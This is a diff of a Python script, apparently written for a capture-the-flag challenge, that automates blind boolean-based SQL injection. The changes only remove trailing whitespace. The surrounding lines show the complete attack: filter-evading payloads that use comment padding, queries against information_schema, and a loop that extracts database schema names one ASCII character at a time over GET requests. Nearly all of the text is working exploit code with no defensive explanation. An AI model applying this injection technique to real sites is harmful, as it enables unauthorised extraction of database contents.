@@ -29,11 +29,11 @@ while sqli_bool_true:
 	# sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/1/**/OFFSET/**/0)/**/FROM/**/1/**/FOR/**/1)))/**/</**/95;#"
 	sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/0;#".format(row_num, guess_pos)
 	# params to be sent with GET request
-	params = {'search':sqli} 
+	params = {'search':sqli}
 
-	# sending post request and saving response as response object 
-	r = requests.get(url = chal_endpoint, params = params) 
-	# extracting response text 
+	# sending post request and saving response as response object
+	r = requests.get(url = chal_endpoint, params = params)
+	# extracting response text
 	sqli_bool_true = response_body in r.text
 
 print("Length of database name is: %s" % (guess_pos - 1))
@@ -52,11 +52,11 @@ for guess_pos in range(1,length_of_name):
 		print("Guessing %s" % ascii_guess)
 		sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/schema_name/**/FROM/**/information_schema.schemata/**/LIMIT/**/1/**/OFFSET/**/{})/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/{};#".format(row_num, guess_pos,ascii_guess)
 		# params to be sent with GET request
-		params = {'search':sqli} 
+		params = {'search':sqli}
 
-		# sending post request and saving response as response object 
-		r = requests.get(url = chal_endpoint, params = params) 
-		# extracting response text 
+		# sending post request and saving response as response object
+		r = requests.get(url = chal_endpoint, params = params)
+		# extracting response text
 		sqli_bool_true = response_body in r.text
 		if sqli_bool_true:
 			if ascii_threshold == 0:
